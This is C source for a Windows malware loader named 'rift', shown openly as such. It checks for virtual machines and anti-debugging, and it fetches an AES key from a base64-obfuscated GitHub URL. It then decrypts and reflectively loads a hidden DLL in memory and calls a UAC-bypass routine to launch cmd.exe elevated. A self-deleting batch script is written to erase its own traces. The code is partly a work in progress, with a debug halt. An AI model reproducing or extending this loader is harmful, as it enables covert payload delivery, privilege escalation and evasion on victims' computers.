#include "pch.h"
#include "_rift.h"

PVOID IDownloadKey();

typedef BOOL(*pEDllInit)(PPIB);
typedef NTSTATUS(*ucmDebugObjectMethod)(_In_ PWSTR pszPayload);

INT WINAPI wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     PWSTR     pCmdLine,
	_In_     INT       nCmdShow
) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	{	// Initialize Process Information block
		HANDLE hPH = GetProcessHeap();
		g_PIB = (PPIB)HeapAlloc(hPH, 0, sizeof(PIB));
		g_PIB->hPH = hPH;
		g_PIB->hMH = hInstance;
		GetModuleFileNameW(hInstance, g_PIB->szMFN, MAX_PATH);
		GetCurrentDirectoryW(MAX_PATH, g_PIB->szCD);
	}


//	fnErasePeHeader();

	MessageBox(0, L"TEST : 1", 0, 0);

	// Halt Execution (Debugging safety)
	for (;;);

#ifndef _DEBUG
	// Protect Process
	BOOL bRE = fnAntiRE();
#endif
	EXoshiroBegin();

	// init con
	// IOpenConsole();
	BOOL bVM = ICheckVmPresent();

	PVOID pWKey = IDownloadKey();
	if (!pWKey) {
		PWSTR szKeyBlob = (PWSTR)AllocMemory(MAX_PATH);
		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->szCD, L"RIFTWKEY"); // Temporery
		DWORD nKeyBlob;
		pWKey = AllocReadFileW(szKeyBlob, &nKeyBlob);
	}
	EAesCryptBegin();
	IAesLoadWKey(pWKey);

	EDecompressBegin();
	EMd5HashBegin();
	SIZE_T nDll;
	PVOID pDll = EUnpackResource(IDR_RIFTDLL, &nDll);
	EMd5HashEnd();
	EDecompressEnd();
	EAesCryptEnd();
	if (!pDll)
		return 0x1;

#ifndef _DEBUG
	// "Reflective" DLL loading will only be used in the release build
	HMEMORYMODULE hDll = MemoryLoadLibrary(pDll, nDll);
	if (!hDll)
		return 0x2;

	pEDllInit EDllInit = (pEDllInit)MemoryGetProcAddress(hDll, "EDllInit");
	int a = EDllInit(10);

	MemoryFreeLibrary(hDll);
#else
	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", 0, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
	if (!dhDll)
		return 0x2;

	pEDllInit EDllInit = (pEDllInit)GetProcAddress(dhDll, "EDllInit");
	BOOL bTest = EDllInit(g_PIB);

	ucmDebugObjectMethod Elevate = (ucmDebugObjectMethod)GetProcAddress(dhDll, "ucmDebugObjectMethod");
	WCHAR payload[] = L"C:\\WINDOWS\\system32\\cmd.exe";
	Elevate(payload);

	FreeLibrary(dhDll);
#endif
	SecureZeroMemory(pDll, nDll);
	FreeMemory(pDll);

	{	// CleanUp
		EXoshiroEnd();

		HANDLE hPH = GetProcessHeap();
		HeapFree(hPH, 0, g_PIB);
	} return 0;
}

// Only Test rn but might be implemented further
PVOID IDownloadKey() {
	PCWSTR szAgent = EAllocRandomBase64StringW(8, 16);
	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
	if (!hNet)
		return 0;
	FreeMemory(szAgent);

	PCSTR szB64URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xpbWEtWC1Db2RpbmcvV2luMzIuX3JpZnQvbWFzdGVyL19yaWZ0L21haW4uYz90b2tlbj1BSVNMVElGQkxFWE5IREJIWDZaMkZPUzYzUUozVQA=";
	SIZE_T nURL;
	PCSTR szURL = EBase64Decode(szB64URL, 156, &nURL);
	HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, 0, 0, 0, 0);
	if (!hUrl)
		return 0;
	FreeMemory(szURL);

	PVOID pBuffer = AllocMemory(AES_BLOB_SIZE);

	SIZE_T nRead;
	InternetReadFile(hUrl, pBuffer, AES_BLOB_SIZE, &nRead);

	InternetCloseHandle(hUrl);
	InternetCloseHandle(hNet);

	if ((nRead != AES_BLOB_SIZE) || ((DWORD)pBuffer != 0x4d42444b))
		goto EXIT;

	return pBuffer;
EXIT:
	FreeMemory(pBuffer);
	return 0;
}



/*	This function basically does what it's called,
	it "cleans" (or better purges) everything it can and tries to destroy
	all traces of it self (the loader and everything else it extracts).
	It should get triggered ( / called) if any fatal error occurs,
	or the loader catches any suspicious activities (e.g. debuggers).  */
static CONST WCHAR l_szSelfDelBat[] = {
	L"@echo off\n"
	L"%x:\n"
	L"\tdel \"%s\" /f\n"
	L"\tif exist \"%s\" (\n"
	L"\t\tgoto %x\n"
	L"\t)\n"
	L"del \"%s\" /f"
};
VOID ESelfDestruct() {
	// Prepare String for Filename of Batchfile
	PWSTR szFilePath = (PWSTR)AllocMemory(MAX_PATH * sizeof(WCHAR));
	SIZE_T nRandom;
	PCWSTR szRandom = EAllocRandomPathW(8, 16, &nRandom);
	CopyMemory(szFilePath, g_PIB->szCD, MAX_PATH * sizeof(WCHAR));
	PathCchAppend(szFilePath, MAX_PATH * sizeof(WCHAR), szRandom);
	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");

	// Prepare Script content
	PVOID pScriptW = AllocMemory(0x800);
	UINT uiRandomID = EXoshiroSS();
	PCWSTR szMFN = GetFileNameFromPathW(g_PIB->szMFN);
	StringCchPrintfW(pScriptW, 0x400, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, GetFileNameFromPathW(szFilePath));

	// Convert to Raw (ANSI)
	SIZE_T nScript;
	StringCchLengthW(pScriptW, 0x400, &nScript);
	PSTR pScriptA = AllocMemory(0x400);
	WideCharToMultiByte(CP_ACP, 0, pScriptW, -1, pScriptA, 0x400, 0, 0);
	FreeMemory(pScriptW);

	// Write to Disk
	WriteFileCW(szFilePath, pScriptA, nScript);
	FreeMemory(pScriptA);
}